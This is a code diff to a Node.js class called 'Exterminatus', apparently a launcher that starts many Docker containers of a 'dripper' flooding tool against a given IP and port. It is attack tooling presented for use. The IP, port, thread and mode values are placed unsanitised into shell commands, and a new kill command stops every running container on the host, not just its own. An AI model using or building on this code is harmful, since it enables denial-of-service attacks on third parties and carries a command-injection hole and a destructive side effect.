@@ -1,4 +1,5 @@
-const { exec } = require('child_process');
+const util = require('util');
+const exec = util.promisify(require('child_process').exec);
 
 class Exterminatus {
   attack({ ip, port, mode, threads, containers }) {
@@ -6,10 +7,11 @@ class Exterminatus {
       console.error('Incorrect number of containers');
       return;
     }
-    for (let i = containers; i !== 0; i--) {
-      const cmd = `docker run --rm --name="container${i}" alexmon1989/dripper:latest -s ${ip} -p ${port} -t ${threads} -m ${mode} &`
-      console.info(cmd);
-      setTimeout(() => {
+    try {
+      for (let i = containers; i !== 0; i--) {
+        const name = `container${i}`;
+        const cmd = `docker run --rm --name="${name}" alexmon1989/dripper:latest -s ${ip} -p ${port} -t ${threads} -m ${mode}`
+        console.info(cmd);
         exec(cmd, {
           maxBuffer: 1024 * 1024 / containers
         }, (error, stdout, stderr) => {
@@ -18,35 +20,29 @@ class Exterminatus {
             return;
           }
 
-          if (stderr) {
+          if(stderr) {
             console.error(stderr);
-            return;
+            return
           }
 
-          console.info(stdout);
+          console.info(stdout)
         });
-      });
+      }
+    } catch (err) {
+      console.error(err);
     }
   }
 
-  killContainers(times) {
-    const containers = new Array(times).fill('container').map((v, i) => `${v}${i + 1}`).join(' ');
-    const cmd = `docker container kill ${containers} && docker image rm -f alexmon1989/dripper`;
+  killContainers() {
+    const cmd = `docker kill $(docker ps -q) && docker image rm -f alexmon1989/dripper`;
     console.info(cmd);
-    setTimeout(() => {
-      exec(cmd, (error, stdout, stderr) => {
-        if (error) {
-          console.error(error);
-          return;
-        }
+    exec(cmd, (error, stdout) => {
+      if (error) {
+        console.error(error);
+        return;
+      }
 
-        if (stderr) {
-          console.error(stderr);
-          return;
-        }
-
-        console.info(stdout);
-      });
+      console.info(stdout);
     });
   }
 }
